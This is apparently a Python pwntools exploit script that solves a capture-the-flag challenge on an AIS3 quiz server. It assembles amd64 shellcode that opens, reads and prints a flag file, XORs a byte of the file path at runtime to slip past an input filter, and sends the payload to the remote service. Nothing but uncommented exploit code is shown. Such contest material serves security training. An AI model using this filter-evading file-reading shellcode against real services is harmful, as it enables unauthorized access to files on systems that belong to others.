#!/usr/bin/env python

from pwn import *

host = 'quiz.ais3.org'
# host = '127.0.0.1'
port = 9563

r = remote(host, port)

sc = asm(
"""
    jmp _file

_orw:
    pop rdi
    xor BYTE PTR [rdi + 11], 32
    xor rax, rax
    add al, 2
    xor rsi, rsi
    syscall

_read:
    mov rsi, rsp
    mov rdi, rax
    xor rdx, rdx
    add rdx, 42
    xor rax, rax
    syscall

    xor rax, rax
    syscall

    xor rax, rax
    syscall

    xor rdi, rdi
    inc rdi
    xor rax, rax
    add al, 1
    syscall

    xor rax, rax
    add al, 60
    syscall


_file:
    call _orw
    .ascii "/home/pwn3/Flag"
    .byte 0
""", arch = 'amd64')

print len(sc)
print sc

r.recvuntil('):')
r.sendline(sc)

r.interactive()
